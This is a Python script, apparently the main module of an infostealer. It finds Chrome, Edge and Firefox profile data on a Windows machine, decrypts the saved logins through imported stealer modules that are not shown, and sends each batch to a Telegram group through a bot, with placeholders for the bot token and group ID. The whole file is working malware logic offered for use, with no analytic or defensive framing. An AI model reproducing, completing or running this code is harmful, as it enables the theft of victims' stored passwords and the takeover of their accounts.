from telegram import tele_bot
from chrome_stealer import chrome_decryptor
from firefox_stealer import firefox_decrytor
import os


def main():
    token = "BOT TOKEN"
    grp_id = "TELEGRAM GROUP ID"
    bot = tele_bot(token, grp_id)
    browser_groups = (
        ("Google", "Chrome", "chromium"),
        ("Microsoft", "Edge", "chromium"),
        ("Mozilla", "Firefox", "gecko"),
    )

    for vendor, browser, type in browser_groups:
        if type == "chromium":
            if(os.path.exists(os.path.join(
                str(os.environ.get("USERPROFILE")),
                "AppData",
                "Local",
                 vendor,
                 browser,
                "User Data",
                "Local State",
            ))):
                chromium_logins = chrome_decryptor(vendor,browser)
                data = chromium_logins.output()
                bot.send_message(data)

        else:
            gecko_logins = firefox_decrytor(vendor,browser)
            data = gecko_logins.decryt()
            bot.send_message(data)


if __name__ == "__main__":
    main()
